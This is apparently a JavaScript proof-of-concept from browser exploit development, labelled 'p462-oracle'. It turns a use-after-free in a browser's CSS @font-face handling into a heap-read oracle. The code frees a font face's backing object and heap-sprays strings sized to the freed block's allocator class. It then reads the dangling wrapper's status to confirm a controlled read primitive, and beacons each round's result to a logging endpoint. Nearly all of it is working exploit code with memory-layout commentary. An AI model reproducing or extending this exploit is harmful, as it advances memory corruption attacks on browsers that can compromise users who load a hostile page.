// p462-oracle — dangling-wrapper heap-read oracle (no trigger, no crash risk)
// Beacon prefix: V462-
//
// Mechanism (docs/engineering/uaf-frame-analysis.md): a CSS-registered
// @font-face's JS wrapper does NOT own its CSSFontFace backing (that is
// exactly why the UAF exists — the backing dies while the wrapper lives).
// Removing the style element frees the backing with NO frame mid-flight:
// no death risk, no memory pressure, no reloads ever.
//
// After the free, `wrapper.status` reads 4 bytes at offsetof(m_status)
// of whatever occupies the block. Claimant: a 176-char string of one
// repeated char (16B StringImpl header + 176B data = 192B, same bmalloc
// class as CSSFontFace). Fill it with \x03 and the oracle should read
// 0x03030303 → low byte 3 = Status::Success → status reports 'loaded'.
// A status change at all = the oracle reads claimant bytes = controlled
// read primitive. Status 'loaded' from \x03 = we also CHOSE the value.
//
// Rounds repeat in one document forever (claimant char varies per round
// to map what the oracle sees). OOM guard parks quietly if memory ever
// tightens. This page cannot trigger the console error: it never
// reloads and never runs the getter re-entrancy.
(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V462-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  var SLEN = 176;
  var CLAIMANTS = [3, 0, 65, 2, 66];      // \x03, \x00, 'A', \x02, 'B'
  var SPRAY = 200;
  var ROUND_MS = 8000;

  var hb = document.createElement('pre');
  hb.style.cssText = 'position:fixed;top:8px;left:8px;color:#0f0;background:#000;padding:6px;font:12px monospace;z-index:9';
  document.body.appendChild(hb);

  window.onerror = function(msg) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  B('BOOT');
  var roundNo = 0;
  var stopped = false;

  function stop(msg) {
    stopped = true;
    hb.textContent = 'p462 STOPPED: ' + msg;
    hb.style.color = '#ff0';
  }

  function claimantChar() {
    return CLAIMANTS[roundNo % CLAIMANTS.length];
  }

  function findWrapper(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function cleanup() {
    try {
      var st = document.querySelectorAll('style');
      for (var i = 0; i < st.length; i++) st[i].remove();
      document.body.offsetHeight;
    } catch(e) {}
  }

  function round() {
    if (stopped) return;
    roundNo++;
    var ch = claimantChar();
    var tag = 'R' + roundNo + '-c' + ch;
    hb.textContent = 'p462 round ' + roundNo + ' claimant=\\x' + (ch < 16 ? '0' : '') + ch.toString(16);

    // 1. fresh CSS face, grab its wrapper while the backing is alive
    cleanup();
    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: ga; src: local(Helvetica); }';
    document.head.appendChild(fs);
    document.body.offsetHeight;
    var wa = findWrapper('ga');
    if (!wa) { B(tag + '-NOWRAPPER'); setTimeout(round, ROUND_MS); return; }

    var before;
    try { before = wa.status; } catch(e) { B(tag + '-BASETHROW'); setTimeout(round, ROUND_MS); return; }

    // 2. free the backing: remove the style. No frame is running —
    //    unlike the getter window, this free is safe.
    fs.remove();
    document.body.offsetHeight;

    // 3. spray claimant strings of one repeated char
    var strings = [];
    try {
      var s = String.fromCharCode(ch);
      for (var i = 0; i < SPRAY; i++) {
        var t = s.repeat(SLEN);
        t.charCodeAt(SLEN - 1);           // flattened, kept
        strings.push(t);
      }
    } catch (e) {
      B('OOMGUARD');
      stop('allocation failed — parked before any console error');
      return;
    }

    // 4. read the oracle
    var after;
    try { after = wa.status; } catch(e) { B(tag + '-THROW-' + encodeURIComponent(String(e)).slice(0, 40)); after = 'THROW'; }

    if (after !== before) {
      // ORACLE FIRED: the wrapper read bytes of our claimant
      B(tag + '-ORACLE-' + before + '-to-' + after);
      hb.textContent = 'p462 ORACLE: ' + before + ' -> ' + after + ' (claimant \\x' + ch.toString(16) + ')';
      hb.style.color = '#0ff';
      B(tag + '-TOTAL-ORACLE-HIT');
      // keep claimants + wrapper alive; stop sweeping
      return;
    }
    B(tag + '-silent-' + before);

    // 5. also read through the wrapper after dropping claimants (stale-
    //    block differential: does the block get reused by WebCore itself?)
    strings = null;
    var later;
    try { later = wa.status; } catch(e) { later = 'THROW'; }
    if (later !== before && later !== after) B(tag + '-LATER-' + later);

    setTimeout(round, ROUND_MS);
  }

  round();
})();
